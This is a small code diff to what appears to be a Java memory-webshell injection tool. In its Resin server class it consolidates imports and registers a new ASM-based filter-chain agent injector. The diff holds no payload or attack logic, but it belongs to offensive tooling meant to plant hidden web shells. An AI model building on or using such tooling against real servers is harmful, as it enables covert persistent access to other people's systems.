@@ -1,9 +1,6 @@
 package com.reajason.javaweb.memshell.server;
 
-import com.reajason.javaweb.memshell.injector.resin.ResinFilterChainAgentInjector;
-import com.reajason.javaweb.memshell.injector.resin.ResinFilterInjector;
-import com.reajason.javaweb.memshell.injector.resin.ResinListenerInjector;
-import com.reajason.javaweb.memshell.injector.resin.ResinServletInjector;
+import com.reajason.javaweb.memshell.injector.resin.*;
 import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
 import net.bytebuddy.asm.Advice;
 import net.bytebuddy.implementation.bytecode.assign.Assigner;
@@ -35,6 +32,7 @@ public class ResinShell extends AbstractShell {
                 .addInjector(FILTER, ResinFilterInjector.class)
                 .addInjector(LISTENER, ResinListenerInjector.class)
                 .addInjector(AGENT_FILTER_CHAIN, ResinFilterChainAgentInjector.class)
+                .addInjector(AGENT_FILTER_CHAIN_ASM, ResinFilterChainAgentWithAsmInjector.class)
                 .build();
     }
 }
